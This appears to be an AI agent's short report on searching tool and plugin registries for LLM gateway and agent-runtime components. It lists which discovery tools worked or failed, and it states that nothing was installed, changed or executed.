- **GitHub Agent Finder:** `search` and `agents` worked; `explore` failed once with “Unexpected response type.” Results were mostly unrelated skills/plugins rather than a gateway/runtime core.
- **MCPfinder:** `browse_categories`, `search_mcp_servers`, `get_server_details`, and `get_install_config` were used, starting with the Official Registry then broader registries. No candidates were installed.
- **find-skills:** The installed `find-skills` instructions and skills ecosystem searches were used. The `skills` CLI was unavailable; it was not invoked through `npx` because the task prohibits package installation. Read-only skills.sh searches were the fallback. Results such as MCP Builder, LangGraph, Mastra, Vercel AI SDK, and Azure AI Gateway were guidance, not runtime components.
- **OpenAI Plugin Directory:** No programmatic discovery tool was exposed, so no directory search was performed. Manual `/plugins` searches should include “LLM gateway/provider router,” “OpenAI Responses and Anthropic Messages compatibility,” “durable agent runtime/checkpoint/resume,” “MCP filesystem/shell/Git/worktree,” and “browser automation/audit.”
- **Other discovery limitations:** A CUA browser attempt failed because the Codex auth token was unavailable; read-only HTTP was used for the skills search. No files were changed, packages installed, credentials added, repositories cloned, or candidate code executed.
